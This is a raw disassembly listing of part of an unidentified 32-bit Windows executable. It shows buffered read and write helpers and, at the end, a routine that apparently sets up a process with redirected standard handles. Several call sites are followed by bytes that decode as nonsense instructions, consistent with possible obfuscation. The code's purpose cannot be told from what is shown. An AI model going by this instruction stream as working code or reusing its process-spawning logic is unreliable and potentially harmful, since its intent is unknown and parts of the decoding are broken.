  40269c:	6a 01                	push   $0x1
  40269e:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4026a2:	51                   	push   %ecx
  4026a3:	52                   	push   %edx
  4026a4:	ff 15 5c 52 40 00    	call   *0x40525c
  4026aa:	85 c0                	test   %eax,%eax
  4026ac:	74 21                	je     0x4026cf
  4026ae:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  4026b3:	74 1a                	je     0x4026cf
  4026b5:	8b 06                	mov    (%esi),%eax
  4026b7:	6a 01                	push   $0x1
  4026b9:	6a 00                	push   $0x0
  4026bb:	6a ff                	push   $0xffffffff
  4026bd:	50                   	push   %eax
  4026be:	ff 15 60 52 40 00    	call   *0x405260
  4026c4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026c8:	5e                   	pop    %esi
  4026c9:	83 c4 08             	add    $0x8,%esp
  4026cc:	c2 04 00             	ret    $0x4
  4026cf:	83 c8 ff             	or     $0xffffffff,%eax
  4026d2:	5e                   	pop    %esi
  4026d3:	83 c4 08             	add    $0x8,%esp
  4026d6:	c2 04 00             	ret    $0x4
  4026d9:	cc                   	int3
  4026da:	cc                   	int3
  4026db:	cc                   	int3
  4026dc:	cc                   	int3
  4026dd:	cc                   	int3
  4026de:	cc                   	int3
  4026df:	cc                   	int3
  4026e0:	51                   	push   %ecx
  4026e1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4026e5:	8b 0d 7c 57 40 00    	mov    0x40577c,%ecx
  4026eb:	50                   	push   %eax
  4026ec:	51                   	push   %ecx
  4026ed:	c6 44 24 0b 00       	movb   $0x0,0xb(%esp)
  4026f2:	e8 04 0d 00 00       	call   0x4033fb
  4026f7:	85 c0                	test   %eax,%eax
  4026f9:	74 2f                	je     0x40272a
  4026fb:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4026ff:	8d 54 24 03          	lea    0x3(%esp),%edx
  402703:	74 12                	je     0x402717
  402705:	6a 01                	push   $0x1
  402707:	52                   	push   %edx
  402708:	50                   	push   %eax
  402709:	e8 82 00 00 00       	call   0x402790
  40270e:	0f be 44 24 03       	movsbl 0x3(%esp),%eax
  402713:	59                   	pop    %ecx
  402714:	c2 04 00             	ret    $0x4
  402717:	8b 00                	mov    (%eax),%eax
  402719:	6a 00                	push   $0x0
  40271b:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40271f:	51                   	push   %ecx
  402720:	6a 01                	push   $0x1
  402722:	52                   	push   %edx
  402723:	50                   	push   %eax
  402724:	ff 15 5c 52 40 00    	call   *0x40525c
  40272a:	0f be 44 24 03       	movsbl 0x3(%esp),%eax
  40272f:	59                   	pop    %ecx
  402730:	c2 04 00             	ret    $0x4
  402733:	cc                   	int3
  402734:	cc                   	int3
  402735:	cc                   	int3
  402736:	cc                   	int3
  402737:	cc                   	int3
  402738:	cc                   	int3
  402739:	cc                   	int3
  40273a:	cc                   	int3
  40273b:	cc                   	int3
  40273c:	cc                   	int3
  40273d:	cc                   	int3
  40273e:	cc                   	int3
  40273f:	cc                   	int3
  402740:	51                   	push   %ecx
  402741:	8b 44 24 08          	mov    0x8(%esp),%eax
  402745:	8b 0d 7c 57 40 00    	mov    0x40577c,%ecx
  40274b:	50                   	push   %eax
  40274c:	51                   	push   %ecx
  40274d:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402754:	00 
  402755:	e8 a1 0c 00 00       	call   0x4033fb
  40275a:	85 c0                	test   %eax,%eax
  40275c:	74 2a                	je     0x402788
  40275e:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402762:	8d 54 24 0c          	lea    0xc(%esp),%edx
  402766:	74 0d                	je     0x402775
  402768:	6a 01                	push   $0x1
  40276a:	52                   	push   %edx
  40276b:	50                   	push   %eax
  40276c:	e8 4f 01 00 00       	call   0x4028c0
  402771:	59                   	pop    %ecx
  402772:	c2 08 00             	ret    $0x8
  402775:	8b 00                	mov    (%eax),%eax
  402777:	6a 00                	push   $0x0
  402779:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40277d:	51                   	push   %ecx
  40277e:	6a 01                	push   $0x1
  402780:	52                   	push   %edx
  402781:	50                   	push   %eax
  402782:	ff 15 4c 52 40 00    	call   *0x40524c
  402788:	8b 04 24             	mov    (%esp),%eax
  40278b:	59                   	pop    %ecx
  40278c:	c2 08 00             	ret    $0x8
  40278f:	cc                   	int3
  402790:	53                   	push   %ebx
  402791:	56                   	push   %esi
  402792:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402796:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  40279a:	57                   	push   %edi
  40279b:	75 14                	jne    0x4027b1
  40279d:	56                   	push   %esi
  40279e:	e8 ff 79 00 00       	call   0x40a1a2
  4027a3:	e8 30 7a 00 00       	call   0x40a1d8
  4027a8:	cf                   	iret
  4027a9:	25 e8 64 7a 00       	and    $0x7a64e8,%eax
  4027ae:	00 ae f9 8b 5e 0c    	add    %ch,0xc5e8bf9(%esi)
  4027b4:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4027b8:	3b df                	cmp    %edi,%ebx
  4027ba:	7c 6e                	jl     0x40282a
  4027bc:	8b 46 10             	mov    0x10(%esi),%eax
  4027bf:	03 46 04             	add    0x4(%esi),%eax
  4027c2:	8b cf                	mov    %edi,%ecx
  4027c4:	2b c3                	sub    %ebx,%eax
  4027c6:	83 e9 01             	sub    $0x1,%ecx
  4027c9:	74 4c                	je     0x402817
  4027cb:	83 e9 01             	sub    $0x1,%ecx
  4027ce:	74 32                	je     0x402802
  4027d0:	83 e9 02             	sub    $0x2,%ecx
  4027d3:	74 1a                	je     0x4027ef
  4027d5:	57                   	push   %edi
  4027d6:	50                   	push   %eax
  4027d7:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4027db:	50                   	push   %eax
  4027dc:	e8 8b 79 00 00       	call   0x40a16c
  4027e1:	83 c4 0c             	add    $0xc,%esp
  4027e4:	29 7e 0c             	sub    %edi,0xc(%esi)
  4027e7:	8b c7                	mov    %edi,%eax
  4027e9:	5f                   	pop    %edi
  4027ea:	5e                   	pop    %esi
  4027eb:	5b                   	pop    %ebx
  4027ec:	c2 0c 00             	ret    $0xc
  4027ef:	8b 08                	mov    (%eax),%ecx
  4027f1:	8b 54 24 14          	mov    0x14(%esp),%edx
  4027f5:	89 0a                	mov    %ecx,(%edx)
  4027f7:	29 7e 0c             	sub    %edi,0xc(%esi)
  4027fa:	8b c7                	mov    %edi,%eax
  4027fc:	5f                   	pop    %edi
  4027fd:	5e                   	pop    %esi
  4027fe:	5b                   	pop    %ebx
  4027ff:	c2 0c 00             	ret    $0xc
  402802:	66 8b 00             	mov    (%eax),%ax
  402805:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402809:	66 89 01             	mov    %ax,(%ecx)
  40280c:	29 7e 0c             	sub    %edi,0xc(%esi)
  40280f:	8b c7                	mov    %edi,%eax
  402811:	5f                   	pop    %edi
  402812:	5e                   	pop    %esi
  402813:	5b                   	pop    %ebx
  402814:	c2 0c 00             	ret    $0xc
  402817:	8a 10                	mov    (%eax),%dl
  402819:	8b 44 24 14          	mov    0x14(%esp),%eax
  40281d:	88 10                	mov    %dl,(%eax)
  40281f:	29 7e 0c             	sub    %edi,0xc(%esi)
  402822:	8b c7                	mov    %edi,%eax
  402824:	5f                   	pop    %edi
  402825:	5e                   	pop    %esi
  402826:	5b                   	pop    %ebx
  402827:	c2 0c 00             	ret    $0xc
  40282a:	8b 4e 10             	mov    0x10(%esi),%ecx
  40282d:	55                   	push   %ebp
  40282e:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  402832:	2b cb                	sub    %ebx,%ecx
  402834:	03 4e 04             	add    0x4(%esi),%ecx
  402837:	53                   	push   %ebx
  402838:	51                   	push   %ecx
  402839:	55                   	push   %ebp
  40283a:	e8 d8 77 00 00       	call   0x40a017
  40283f:	8b 46 08             	mov    0x8(%esi),%eax
  402842:	83 c4 0c             	add    $0xc,%esp
  402845:	2b fb                	sub    %ebx,%edi
  402847:	03 eb                	add    %ebx,%ebp
  402849:	3b f8                	cmp    %eax,%edi
  40284b:	6a 00                	push   $0x0
  40284d:	7c 24                	jl     0x402873
  40284f:	8b 06                	mov    (%esi),%eax
  402851:	8d 54 24 18          	lea    0x18(%esp),%edx
  402855:	52                   	push   %edx
  402856:	57                   	push   %edi
  402857:	55                   	push   %ebp
  402858:	50                   	push   %eax
  402859:	e8 99 78 00 00       	call   0x40a0f7
  40285e:	07                   	pop    %es
  40285f:	8b 44 24 14          	mov    0x14(%esp),%eax
  402863:	5d                   	pop    %ebp
  402864:	5f                   	pop    %edi
  402865:	e8 c7 78 00 00       	call   0x40a131
  40286a:	27                   	daa
  40286b:	50                   	push   %eax
  40286c:	5e                   	pop    %esi
  40286d:	03 c3                	add    %ebx,%eax
  40286f:	5b                   	pop    %ebx
  402870:	c2 0c 00             	ret    $0xc
  402873:	8b 56 04             	mov    0x4(%esi),%edx
  402876:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40287a:	51                   	push   %ecx
  40287b:	50                   	push   %eax
  40287c:	8b 06                	mov    (%esi),%eax
  40287e:	52                   	push   %edx
  40287f:	50                   	push   %eax
  402880:	e8 02 78 00 00       	call   0x40a087
  402885:	89 8b 44 24 14 3b    	mov    %ecx,0x3b142444(%ebx)
  40288b:	f8                   	clc
  40288c:	89 46 0c             	mov    %eax,0xc(%esi)
  40288f:	89 46 10             	mov    %eax,0x10(%esi)
  402892:	7e 02                	jle    0x402896
  402894:	8b f8                	mov    %eax,%edi
  402896:	8b 4e 04             	mov    0x4(%esi),%ecx
  402899:	57                   	push   %edi
  40289a:	51                   	push   %ecx
  40289b:	55                   	push   %ebp
  40289c:	e8 20 78 00 00       	call   0x40a0c1
  4028a1:	29 7e 0c             	sub    %edi,0xc(%esi)
  4028a4:	83 c4 0c             	add    $0xc,%esp
  4028a7:	5d                   	pop    %ebp
  4028a8:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  4028ab:	5f                   	pop    %edi
  4028ac:	5e                   	pop    %esi
  4028ad:	5b                   	pop    %ebx
  4028ae:	c2 0c 00             	ret    $0xc
  4028b1:	cc                   	int3
  4028b2:	cc                   	int3
  4028b3:	cc                   	int3
  4028b4:	cc                   	int3
  4028b5:	cc                   	int3
  4028b6:	cc                   	int3
  4028b7:	cc                   	int3
  4028b8:	cc                   	int3
  4028b9:	cc                   	int3
  4028ba:	cc                   	int3
  4028bb:	cc                   	int3
  4028bc:	cc                   	int3
  4028bd:	cc                   	int3
  4028be:	cc                   	int3
  4028bf:	cc                   	int3
  4028c0:	51                   	push   %ecx
  4028c1:	56                   	push   %esi
  4028c2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4028c6:	83 7e 14 01          	cmpl   $0x1,0x14(%esi)
  4028ca:	57                   	push   %edi
  4028cb:	e8 3e 8a 00 00       	call   0x40b30e
  4028d0:	44                   	inc    %esp
  4028d1:	54                   	push   %esp
  4028d2:	67 75 20             	addr16 jne 0x4028f5
  4028d5:	8b 46 0c             	mov    0xc(%esi),%eax
  4028d8:	8b 0e                	mov    (%esi),%ecx
  4028da:	6a 01                	push   $0x1
  4028dc:	6a 00                	push   $0x0
  4028de:	f7 d8                	neg    %eax
  4028e0:	50                   	push   %eax
  4028e1:	51                   	push   %ecx
  4028e2:	e8 3f 8b 00 00       	call   0x40b426
  4028e7:	6c                   	insb   (%dx),%es:(%edi)
  4028e8:	8b 56 08             	mov    0x8(%esi),%edx
  4028eb:	e8 70 8b 00 00       	call   0x40b460
  4028f0:	45                   	inc    %ebp
  4028f1:	ab                   	stos   %eax,%es:(%edi)
  4028f2:	89 56 0c             	mov    %edx,0xc(%esi)
  4028f5:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4028f8:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4028fc:	3b cf                	cmp    %edi,%ecx
  4028fe:	7e 6e                	jle    0x40296e
  402900:	8b 46 08             	mov    0x8(%esi),%eax
  402903:	03 46 04             	add    0x4(%esi),%eax
  402906:	2b c1                	sub    %ecx,%eax
  402908:	8b cf                	mov    %edi,%ecx
  40290a:	83 e9 01             	sub    $0x1,%ecx
  40290d:	74 4c                	je     0x40295b
  40290f:	83 e9 01             	sub    $0x1,%ecx
  402912:	74 32                	je     0x402946
  402914:	83 e9 02             	sub    $0x2,%ecx
  402917:	74 1a                	je     0x402933
  402919:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40291d:	57                   	push   %edi
  40291e:	51                   	push   %ecx
  40291f:	50                   	push   %eax
  402920:	e8 cb 8a 00 00       	call   0x40b3f0
  402925:	83 c4 0c             	add    $0xc,%esp
  402928:	29 7e 0c             	sub    %edi,0xc(%esi)
  40292b:	8b c7                	mov    %edi,%eax
  40292d:	5f                   	pop    %edi
  40292e:	5e                   	pop    %esi
  40292f:	59                   	pop    %ecx
  402930:	c2 0c 00             	ret    $0xc
  402933:	8b 54 24 14          	mov    0x14(%esp),%edx
  402937:	8b 0a                	mov    (%edx),%ecx
  402939:	89 08                	mov    %ecx,(%eax)
  40293b:	29 7e 0c             	sub    %edi,0xc(%esi)
  40293e:	8b c7                	mov    %edi,%eax
  402940:	5f                   	pop    %edi
  402941:	5e                   	pop    %esi
  402942:	59                   	pop    %ecx
  402943:	c2 0c 00             	ret    $0xc
  402946:	8b 54 24 14          	mov    0x14(%esp),%edx
  40294a:	66 8b 0a             	mov    (%edx),%cx
  40294d:	66 89 08             	mov    %cx,(%eax)
  402950:	29 7e 0c             	sub    %edi,0xc(%esi)
  402953:	8b c7                	mov    %edi,%eax
  402955:	5f                   	pop    %edi
  402956:	5e                   	pop    %esi
  402957:	59                   	pop    %ecx
  402958:	c2 0c 00             	ret    $0xc
  40295b:	8b 54 24 14          	mov    0x14(%esp),%edx
  40295f:	8a 0a                	mov    (%edx),%cl
  402961:	88 08                	mov    %cl,(%eax)
  402963:	29 7e 0c             	sub    %edi,0xc(%esi)
  402966:	8b c7                	mov    %edi,%eax
  402968:	5f                   	pop    %edi
  402969:	5e                   	pop    %esi
  40296a:	59                   	pop    %ecx
  40296b:	c2 0c 00             	ret    $0xc
  40296e:	56                   	push   %esi
  40296f:	e8 d6 89 00 00       	call   0x40b34a
  402974:	8b 46 08             	mov    0x8(%esi),%eax
  402977:	3b f8                	cmp    %eax,%edi
  402979:	7c 20                	jl     0x40299b
  40297b:	8b 44 24 14          	mov    0x14(%esp),%eax
  40297f:	8b 0e                	mov    (%esi),%ecx
  402981:	6a 00                	push   $0x0
  402983:	8d 54 24 0c          	lea    0xc(%esp),%edx
  402987:	52                   	push   %edx
  402988:	57                   	push   %edi
  402989:	50                   	push   %eax
  40298a:	51                   	push   %ecx
  40298b:	e8 26 8a 00 00       	call   0x40b3b6
  402990:	6b 8b 44 24 08 5f 5e 	imul   $0x5e,0x5f082444(%ebx),%ecx
  402997:	59                   	pop    %ecx
  402998:	c2 0c 00             	ret    $0xc
  40299b:	8b 4e 04             	mov    0x4(%esi),%ecx
  40299e:	2b 4e 0c             	sub    0xc(%esi),%ecx
  4029a1:	8b 54 24 14          	mov    0x14(%esp),%edx
  4029a5:	57                   	push   %edi
  4029a6:	52                   	push   %edx
  4029a7:	03 c8                	add    %eax,%ecx
  4029a9:	51                   	push   %ecx
  4029aa:	e8 d1 89 00 00       	call   0x40b380
  4029af:	83 c4 0c             	add    $0xc,%esp
  4029b2:	29 7e 0c             	sub    %edi,0xc(%esi)
  4029b5:	8b c7                	mov    %edi,%eax
  4029b7:	5f                   	pop    %edi
  4029b8:	5e                   	pop    %esi
  4029b9:	59                   	pop    %ecx
  4029ba:	c2 0c 00             	ret    $0xc
  4029bd:	ff 74 24 04          	push   0x4(%esp)
  4029c1:	ff 35 80 57 40 00    	push   0x405780
  4029c7:	e8 2f 0a 00 00       	call   0x4033fb
  4029cc:	85 c0                	test   %eax,%eax
  4029ce:	74 17                	je     0x4029e7
  4029d0:	ff 30                	push   (%eax)
  4029d2:	ff 15 50 52 40 00    	call   *0x405250
  4029d8:	ff 74 24 04          	push   0x4(%esp)
  4029dc:	ff 35 80 57 40 00    	push   0x405780
  4029e2:	e8 3f 0a 00 00       	call   0x403426
  4029e7:	c2 04 00             	ret    $0x4
  4029ea:	6a 00                	push   $0x0
  4029ec:	6a 00                	push   $0x0
  4029ee:	6a 10                	push   $0x10
  4029f0:	e8 8e 4c 00 00       	call   0x407683
  4029f5:	e8 69 4d 00 00       	call   0x407763
  4029fa:	6a 04                	push   $0x4
  4029fc:	6a 04                	push   $0x4
  4029fe:	e8 96 4d 00 00       	call   0x407799
  402a03:	e8 c7 4d 00 00       	call   0x4077cf
  402a08:	e8 a6 4e 00 00       	call   0x4078b3
  402a0d:	e8 d7 4e 00 00       	call   0x4078e9
  402a12:	e8 08 4f 00 00       	call   0x40791f
  402a17:	36 c3                	ss ret
  402a19:	53                   	push   %ebx
  402a1a:	56                   	push   %esi
  402a1b:	57                   	push   %edi
  402a1c:	ff 74 24 10          	push   0x10(%esp)
  402a20:	e8 4f 5d 00 00       	call   0x408774
  402a25:	53                   	push   %ebx
  402a26:	e8 7f 5d 00 00       	call   0x4087aa
  402a2b:	53                   	push   %ebx
  402a2c:	8b f0                	mov    %eax,%esi
  402a2e:	56                   	push   %esi
  402a2f:	e8 1a 60 00 00       	call   0x408a4e
  402a34:	9a e8 4e 60 00 00 f7 	lcall  $0xf700,$0x604ee8
  402a3b:	e8 82 60 00 00       	call   0x408ac2
  402a40:	56                   	push   %esi
  402a41:	8b f8                	mov    %eax,%edi
  402a43:	e8 b0 60 00 00       	call   0x408af8
  402a48:	85 c0                	test   %eax,%eax
  402a4a:	59                   	pop    %ecx
  402a4b:	59                   	pop    %ecx
  402a4c:	75 14                	jne    0x402a62
  402a4e:	8d 47 fc             	lea    -0x4(%edi),%eax
  402a51:	50                   	push   %eax
  402a52:	8d 46 04             	lea    0x4(%esi),%eax
  402a55:	50                   	push   %eax
  402a56:	56                   	push   %esi
  402a57:	e8 ae 61 00 00       	call   0x408c0a
  402a5c:	83 c4 0c             	add    $0xc,%esp
  402a5f:	83 ef 04             	sub    $0x4,%edi
  402a62:	2b df                	sub    %edi,%ebx
  402a64:	53                   	push   %ebx
  402a65:	e8 fe 60 00 00       	call   0x408b68
  402a6a:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  402a6e:	5f                   	pop    %edi
  402a6f:	5e                   	pop    %esi
  402a70:	5b                   	pop    %ebx
  402a71:	c2 04 00             	ret    $0x4
  402a74:	55                   	push   %ebp
  402a75:	8b ec                	mov    %esp,%ebp
  402a77:	51                   	push   %ecx
  402a78:	56                   	push   %esi
  402a79:	e8 cb 96 00 00       	call   0x40c149
  402a7e:	f5                   	cmc
  402a7f:	6a 02                	push   $0x2
  402a81:	6a 00                	push   $0x0
  402a83:	6a 00                	push   $0x0
  402a85:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402a88:	50                   	push   %eax
  402a89:	ff d6                	call   *%esi
  402a8b:	50                   	push   %eax
  402a8c:	ff 37                	push   (%edi)
  402a8e:	ff d6                	call   *%esi
  402a90:	50                   	push   %eax
  402a91:	e8 ed 96 00 00       	call   0x40c183
  402a96:	f9                   	stc
  402a97:	85 c0                	test   %eax,%eax
  402a99:	5e                   	pop    %esi
  402a9a:	74 0d                	je     0x402aa9
  402a9c:	ff 37                	push   (%edi)
  402a9e:	e8 1a 97 00 00       	call   0x40c1bd
  402aa3:	e3 8b                	jecxz  0x402a30
  402aa5:	45                   	inc    %ebp
  402aa6:	fc                   	cld
  402aa7:	89 07                	mov    %eax,(%edi)
  402aa9:	c9                   	leave
  402aaa:	c3                   	ret
  402aab:	55                   	push   %ebp
  402aac:	8d 6c 24 9c          	lea    -0x64(%esp),%ebp
  402ab0:	e8 64 8b 00 00       	call   0x40b619
  402ab5:	db 53 56             	fistl  0x56(%ebx)
  402ab8:	57                   	push   %edi
  402ab9:	33 db                	xor    %ebx,%ebx
  402abb:	6a 44                	push   $0x44
  402abd:	5e                   	pop    %esi
  402abe:	56                   	push   %esi
  402abf:	33 ff                	xor    %edi,%edi
  402ac1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402ac4:	53                   	push   %ebx
  402ac5:	47                   	inc    %edi
  402ac6:	50                   	push   %eax
  402ac7:	e8 87 8b 00 00       	call   0x40b653
  402acc:	8e 78 89             	mov    -0x77(%eax),%?
  402acf:	5d                   	pop    %ebp
  402ad0:	58                   	pop    %eax
  402ad1:	89 5d 50             	mov    %ebx,0x50(%ebp)
  402ad4:	89 5d 44             	mov    %ebx,0x44(%ebp)
  402ad7:	89 5d 5c             	mov    %ebx,0x5c(%ebp)
  402ada:	89 5d 48             	mov    %ebx,0x48(%ebp)
  402add:	89 5d 54             	mov    %ebx,0x54(%ebp)
  402ae0:	89 5d 40             	mov    %ebx,0x40(%ebp)
  402ae3:	89 5d 4c             	mov    %ebx,0x4c(%ebp)
  402ae6:	e8 a3 8b 00 00       	call   0x40b68e
  402aeb:	e9 b8 89 5d 34       	jmp    0x349db4a8
  402af0:	89 7d 38             	mov    %edi,0x38(%ebp)
  402af3:	e8 d1 8b 00 00       	call   0x40b6c9
  402af8:	8a 4d 78             	mov    0x78(%ebp),%cl
  402afb:	83 c4 0c             	add    $0xc,%esp
  402afe:	f6 c1 02             	test   $0x2,%cl
  402b01:	89 75 dc             	mov    %esi,-0x24(%ebp)
  402b04:	89 7d 08             	mov    %edi,0x8(%ebp)
  402b07:	74 0d                	je     0x402b16
  402b09:	66 89 5d 0c          	mov    %bx,0xc(%ebp)
  402b0d:	e8 b1 98 00 00       	call   0x40c3c3
  402b12:	34 09                	xor    $0x9,%al
  402b14:	eb 04                	jmp    0x402b1a
  402b16:	66 89 7d 0c          	mov    %di,0xc(%ebp)
  402b1a:	f6 c1 40             	test   $0x40,%cl
  402b1d:	e8 dd 8b 00 00       	call   0x40b6ff
  402b22:	74 1d                	je     0x402b41
  402b24:	8b 45 7c             	mov    0x7c(%ebp),%eax
  402b27:	3b c3                	cmp    %ebx,%eax
  402b29:	74 16                	je     0x402b41
  402b2b:	8b 40 0c             	mov    0xc(%eax),%eax
  402b2e:	3b c3                	cmp    %ebx,%eax
  402b30:	74 0f                	je     0x402b41
  402b32:	e8 51 98 00 00       	call   0x40c388
  402b37:	91                   	xchg   %eax,%ecx
  402b38:	26 89 45 14          	mov    %eax,%es:0x14(%ebp)
  402b3c:	89 7d 4c             	mov    %edi,0x4c(%ebp)
  402b3f:	eb 39                	jmp    0x402b7a
  402b41:	f6 c1 04             	test   $0x4,%cl
  402b44:	74 38                	je     0x402b7e
  402b46:	f6 c1 10             	test   $0x10,%cl
  402b49:	74 33                	je     0x402b7e
  402b4b:	53                   	push   %ebx
  402b4c:	8d 45 30             	lea    0x30(%ebp),%eax
  402b4f:	50                   	push   %eax
  402b50:	8d 45 50             	lea    0x50(%ebp),%eax
  402b53:	50                   	push   %eax
  402b54:	8d 45 58             	lea    0x58(%ebp),%eax
  402b57:	50                   	push   %eax
  402b58:	e8 80 97 00 00       	call   0x40c2dd
  402b5d:	59                   	pop    %ecx
  402b5e:	85 c0                	test   %eax,%eax
  402b60:	74 1c                	je     0x402b7e
  402b62:	8b 45 58             	mov    0x58(%ebp),%eax
  402b65:	09 75 08             	or     %esi,0x8(%ebp)
  402b68:	8d 7d 50             	lea    0x50(%ebp),%edi
  402b6b:	89 45 14             	mov    %eax,0x14(%ebp)
  402b6e:	e8 a4 97 00 00       	call   0x40c317
  402b73:	e8 d5 97 00 00       	call   0x40c34d
  402b78:	b9 d8 83 65 60       	mov    $0x606583d8,%ecx
  402b7d:	f7 8b 45 78 83 e0 04 	testl  $0x3c458904,-0x1f7c87bb(%ebx)
  402b84:	89 45 3c 
  402b87:	74 72                	je     0x402bfb
  402b89:	f6 45 78 08          	testb  $0x8,0x78(%ebp)
  402b8d:	74 33                	je     0x402bc2
  402b8f:	53                   	push   %ebx
  402b90:	8d 45 30             	lea    0x30(%ebp),%eax
  402b93:	50                   	push   %eax
  402b94:	8d 45 5c             	lea    0x5c(%ebp),%eax
  402b97:	50                   	push   %eax
  402b98:	8d 45 44             	lea    0x44(%ebp),%eax
  402b9b:	50                   	push   %eax
  402b9c:	e8 91 96 00 00       	call   0x40c232
  402ba1:	5c                   	pop    %esp
  402ba2:	85 c0                	test   %eax,%eax
  402ba4:	74 1c                	je     0x402bc2
  402ba6:	8b 45 5c             	mov    0x5c(%ebp),%eax
  402ba9:	09 75 08             	or     %esi,0x8(%ebp)
  402bac:	8d 7d 44             	lea    0x44(%ebp),%edi
  402baf:	89 45 18             	mov    %eax,0x18(%ebp)
  402bb2:	e8 b5 96 00 00       	call   0x40c26c
  402bb7:	83 65 60 f7          	andl   $0xfffffff7,0x60(%ebp)
  402bbb:	e8 e2 96 00 00       	call   0x40c2a2
  402bc0:	ac                   	lods   %ds:(%esi),%al
  402bc1:	6b f6 45             	imul   $0x45,%esi,%esi
  402bc4:	78 20                	js     0x402be6
  402bc6:	74 33                	je     0x402bfb
  402bc8:	53                   	push   %ebx
  402bc9:	8d 45 30             	lea    0x30(%ebp),%eax
  402bcc:	50                   	push   %eax
  402bcd:	8d 45 54             	lea    0x54(%ebp),%eax
  402bd0:	50                   	push   %eax
  402bd1:	8d 45 48             	lea    0x48(%ebp),%eax
  402bd4:	50                   	push   %eax
  402bd5:	e8 ff 94 00 00       	call   0x40c0d9
  402bda:	e3 85                	jecxz  0x402b61
  402bdc:	c0 74 1c 8b 45       	shlb   $0x45,-0x75(%esp,%ebx,1)
  402be1:	54                   	push   %esp
  402be2:	09 75 08             	or     %esi,0x8(%ebp)
  402be5:	8d 7d 48             	lea    0x48(%ebp),%edi
  402be8:	89 45 1c             	mov    %eax,0x1c(%ebp)
  402beb:	e8 23 95 00 00       	call   0x40c113
  402bf0:	83 65 60 f7          	andl   $0xfffffff7,0x60(%ebp)
  402bf4:	e8 fe 95 00 00       	call   0x40c1f7
  402bf9:	05 57 85 75 08       	add    $0x8758557,%eax
  402bfe:	74 2a                	je     0x402c2a
  402c00:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  402c03:	e8 97 94 00 00       	call   0x40c09f
  402c08:	2a 75 07             	sub    0x7(%ebp),%dh
  402c0b:	6a f6                	push   $0xfffffff6
  402c0d:	ff d6                	call   *%esi
  402c0f:	89 45 14             	mov    %eax,0x14(%ebp)
  402c12:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  402c15:	75 07                	jne    0x402c1e
  402c17:	6a f5                	push   $0xfffffff5
  402c19:	ff d6                	call   *%esi
  402c1b:	89 45 18             	mov    %eax,0x18(%ebp)
  402c1e:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  402c21:	75 07                	jne    0x402c2a
  402c23:	6a f4                	push   $0xfffffff4
  402c25:	ff d6                	call   *%esi
  402c27:	89 45 1c             	mov    %eax,0x1c(%ebp)
  402c2a:	8b 7d 6c             	mov    0x6c(%ebp),%edi
  402c2d:	3b fb                	cmp    %ebx,%edi
  402c2f:	75 05                	jne    0x402c36
  402c31:	e8 33 94 00 00       	call   0x40c069
  402c36:	39 5d 70             	cmp    %ebx,0x70(%ebp)
  402c39:	75 07                	jne    0x402c42
  402c3b:	e8 ee 93 00 00       	call   0x40c02e
  402c40:	b5 28                	mov    $0x28,%ch
  402c42:	57                   	push   %edi
  402c43:	e8 ed 8a 00 00       	call   0x40b735
  402c48:	ff 75 70             	push   0x70(%ebp)
  402c4b:	8b f0                	mov    %eax,%esi
  402c4d:	e8 19 8b 00 00       	call   0x40b76b
  402c52:	59                   	pop    %ecx
  402c53:	59                   	pop    %ecx
  402c54:	8d 44 06 04          	lea    0x4(%esi,%eax,1),%eax
  402c58:	50                   	push   %eax
  402c59:	53                   	push   %ebx
  402c5a:	e8 42 8b 00 00       	call   0x40b7a1
  402c5f:	c6                   	(bad)
  402c60:	e8 76 8b 00 00       	call   0x40b7db
  402c65:	66 80 3f 22          	data16 cmpb $0x22,(%edi)
  402c69:	89 45 7c             	mov    %eax,0x7c(%ebp)
  402c6c:	74 23                	je     0x402c91
  402c6e:	e8 e3 92 00 00       	call   0x40bf56
  402c73:	56                   	push   %esi
  402c74:	50                   	push   %eax
  402c75:	e8 12 93 00 00       	call   0x40bf8c
  402c7a:	57                   	push   %edi
  402c7b:	ff 75 7c             	push   0x7c(%ebp)
  402c7e:	e8 3f 93 00 00       	call   0x40bfc2
  402c83:	56                   	push   %esi
  402c84:	ff 75 7c             	push   0x7c(%ebp)
  402c87:	e8 6c 93 00 00       	call   0x40bff8
  402c8c:	83 c4 18             	add    $0x18,%esp
  402c8f:	eb 09                	jmp    0x402c9a
  402c91:	57                   	push   %edi
  402c92:	50                   	push   %eax
  402c93:	e8 7d 8b 00 00       	call   0x40b815
  402c98:	59                   	pop    %ecx
  402c99:	59                   	pop    %ecx
  402c9a:	8b 75 70             	mov    0x70(%ebp),%esi
  402c9d:	38 1e                	cmp    %bl,(%esi)
  402c9f:	74 19                	je     0x402cba
  402ca1:	e8 0e 92 00 00       	call   0x40beb4
  402ca6:	ff 75 7c             	push   0x7c(%ebp)
  402ca9:	e8 3c 92 00 00       	call   0x40beea
  402cae:	56                   	push   %esi
  402caf:	ff 75 7c             	push   0x7c(%ebp)
  402cb2:	e8 69 92 00 00       	call   0x40bf20
  402cb7:	83 c4 10             	add    $0x10,%esp
  402cba:	8b 45 74             	mov    0x74(%ebp),%eax
  402cbd:	3b c3                	cmp    %ebx,%eax
  402cbf:	74 07                	je     0x402cc8
  402cc1:	38 18                	cmp    %bl,(%eax)
  402cc3:	75 03                	jne    0x402cc8
  402cc5:	89 5d 74             	mov    %ebx,0x74(%ebp)
